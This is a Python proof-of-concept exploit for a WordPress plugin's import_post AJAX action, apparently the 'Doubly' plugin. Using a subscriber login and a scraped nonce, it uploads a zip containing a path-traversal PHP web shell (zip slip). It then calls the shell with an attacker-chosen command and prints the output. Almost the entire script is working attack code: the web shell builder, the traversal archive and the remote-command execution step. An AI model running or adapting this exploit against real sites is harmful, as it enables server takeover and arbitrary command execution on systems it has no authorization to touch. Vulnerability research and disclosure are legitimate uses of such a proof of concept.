#!/usr/bin/env python3
"""RCE via import_post (subscriber POV)."""
import argparse, re, json, io, zipfile, random, string, sys
from urllib.parse import urlparse
import requests

def php_s(s: str) -> bytes:
    b = s.encode()
    return b's:%d:"' % len(b) + b + b'";'

def php_serialize_payload(post_name: str) -> bytes:
    # minimal valid content.txt: a:2:{type,posts}
    post = [
        ("post_title", "poc"),
        ("post_content", "poc"),
        ("post_excerpt", ""),
        ("post_name", post_name),
        ("post_content_filtered", ""),
        ("post_type", "page"),
        ("post_mime_type", ""),
        ("post_date", "2026-11-12 04:22:22"),
        ("post_date_gmt", "2026-11-12 04:22:22"),
        ("post_modified", "2026-11-12 04:22:22"),
        ("post_modified_gmt", "2026-11-12 04:22:22"),
        ("post_status", "publish"),
    ]
    out = b'a:2:{' + php_s("type") + php_s("posts") + php_s("posts") + b'a:1:{i:0;a:5:{'
    out += php_s("post") + b'a:%d:{' % len(post)
    for k, v in post:
        out += php_s(k) + php_s(v)
    out += b'}'
    out += php_s("meta") + b'a:0:{}'
    out += php_s("terms") + b'a:0:{}'
    out += php_s("comments") + b'a:0:{}'
    out += php_s("attributes") + b'a:0:{}'
    out += b'}}}'
    return out

def build_shell(marker: str) -> bytes:
    marker_js = json.dumps(marker)
    php = (
        "<?php\n"
        "$marker = " + marker_js + ";\n"
        "$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : 'id';\n"
        "header('Content-Type: text/plain');\n"
        "echo $marker . \"\\n\";\n"
        "if (function_exists('system')) { system($cmd); }\n"
        "elseif (function_exists('exec')) { echo implode(\"\\n\", (array)@exec($cmd)); }\n"
        "elseif (function_exists('passthru')) { passthru($cmd); }\n"
        "else { echo 'no exec function'; }\n"
    )
    return php.encode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="any frontend post/page URL, e.g. http://localhost:8851/wordpress/?page_id=2")
    ap.add_argument("--user", default="testsub")
    ap.add_argument("--password", default="testsub123")
    ap.add_argument("--cmd", default="id", help="command to run through the uploaded shell (default: id)")
    a = ap.parse_args()
    page_url = a.url
    u = urlparse(page_url)
    base = f"{u.scheme}://{u.netloc}"
    # keep subpath up to /wordpress
    m = re.match(r"^(.*\/wordpress)", page_url)
    if m:
        base = m.group(1)
    ajax = base + "/wp-admin/admin-ajax.php"
    s = requests.Session()
    s.post(base + "/wp-login.php", data={"log": a.user, "pwd": a.password, "wp-submit": "Log In", "redirect_to": base + "/wp-admin/", "testcookie": "1"}, timeout=20)
    if "wordpress_logged_in" not in str(s.cookies.get_dict()):
        print("[-] login failed"); sys.exit(1)
    r = s.get(page_url, timeout=20)
    mm = re.search(r'g_strDOUBLYOptions.*?nonce.*?([a-f0-9]{10})', r.text)
    if not mm:
        print("[-] nonce not exposed (allowed_roles likely admin-only)"); sys.exit(1)
    nonce = mm.group(1)
    print(f"[+] nonce={nonce}")
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    marker = f"PWNED_DOUBLY_{rand}"
    shell_name = f"pwned_{rand}.php"
    shell = build_shell(marker)
    post_name = f"poc-{rand}"
    content = php_serialize_payload(post_name)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("content.txt", content)
        z.writestr(f"../../../{shell_name}", shell)
        z.writestr(f"../../{shell_name}", shell)
    data = {"action": "doubly_ajax_actions", "client_action": "import_post", "nonce": nonce, "data": json.dumps({"postid": "new"})}
    r = s.post(ajax, data=data, files={"file": ("poc.zip", buf.getvalue(), "application/zip")}, timeout=60)
    print("[+] import:", r.status_code, r.text[:300])
    for cand in [f"{base}/wp-content/uploads/doubly_cache/{shell_name}", f"{base}/wp-content/uploads/doubly_cache/import/{shell_name}"]:
        try:
            rr = requests.get(cand, params={"cmd": a.cmd}, timeout=20)
            if rr.status_code == 200 and marker in rr.text:
                print(f"[+] RCE confirmed: {cand}?cmd={a.cmd}")
                print("----- command output -----")
                print(rr.text.replace(marker, "").strip()[:2000])
                print("--------------------------")
                return
            print(f"[-] {cand} -> {rr.status_code}")
        except Exception as e:
            print("[-] fetch fail", e)
    print("[-] shell not found")
    sys.exit(2)

if __name__ == "__main__":
    main()
